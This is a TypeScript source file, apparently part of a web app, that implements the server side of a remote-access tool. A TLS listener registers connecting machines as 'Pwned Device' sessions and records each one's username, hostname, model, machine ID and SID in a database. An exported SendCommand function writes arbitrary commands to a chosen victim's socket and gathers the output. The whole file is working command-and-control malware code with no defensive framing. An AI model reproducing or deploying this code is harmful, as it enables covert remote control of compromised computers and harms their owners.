import { eq } from 'drizzle-orm';
import { db } from '$lib/server/db';
import { devices } from '$lib/db/schema';

import tls from "node:tls";
import fs from "node:fs";

interface Client {
    socket:     tls.TLSSocket;
    hostname:   string;
    username:   string;
}
const sessions = new Map<string, Client>();
let server_port = 0;
let output = "";
let recent_sid = "";

async function addSession(sock: tls.TLSSocket, data: string) {
    if (!sock)
        return false;

    const info = JSON.parse(data);
    if (!info.username)
        return false;
    if (!info.hostname)
        return false;
    if (!info.model)
        return false;
    if (!info.machine_id)
        return false;
    if (!info.sid)
        return false;

    const sess_s = `${info.username}:${info.hostname}`;
    sessions.set(sess_s, {
        socket: sock,
        hostname: info.hostname,
        username: info.username,
    });

    try {
        await db.insert(devices).values({
            username: info.username,
            hostname: info.hostname,
            model: info.model,
            machine_id: info.machine_id,
            sid: info.sid
        })
    } catch (e) {
        console.warn("[*] Error Inserting Pwned Device")
        console.error(e);
    }

    console.log("[+] Session Added!");
    return true;
}

const server = tls.createServer({
    key: fs.readFileSync(process.env.key_pem ?? "server-key.pem"),
    cert: fs.readFileSync(process.env.cert_pem ?? "server-cert.pem"),
}, (socket) => {
    let tracked = false;
    let buffer = '';

    // runs after established
    console.log("Secure client connected");
    

    // read stream from remote client
    socket.on('data', async (data) => {
        if (!tracked) {
            tracked = await addSession(socket, data.toString());
        } else {
            buffer += data.toString();
    
            const lines = buffer.split('\n');
            buffer = lines.pop() ?? '';
    
            for (const line of lines) {
                output += line + '\n';
            }
        }
    });

    // flush the buffer string to output
    socket.on('end', () => {
        if (buffer.length) {
            output += buffer;
            buffer = '';
        }
    });

    socket.on("close", (data) => {
        console.log("Connection Closed");
    });
});

// os chooses a port to listen on
server.listen(0, () => {
    const address = server.address();
    if (typeof address === "object" && address) {
        console.log(`Session Server on port ${address.port}`);
        server_port = address.port;
    }
});

export function GetPort() { return server_port }
export function GetOutput() { return output; }
export async function SendCommand(sid: string, cmd: string) {
    if (recent_sid != sid) output = "";
    recent_sid = sid;

    // use sid to query from the DB to
    // get the sess_s used to pull from the map
    const device = await db.select().from(devices)
                    .where(eq(devices.sid, sid)).limit(1).get();
    if (!device) {
        console.error("[-] No Device Found!")
        return false;
    }

    const sess_s = `${device.username}:${device.hostname}`;
    const session = sessions.get(sess_s);
    if (!session) {
        console.error("[-] No Session Found!")
        return false;
    }

    console.log("[*] Writing to Session");
    session.socket.write(cmd);
    return true;
}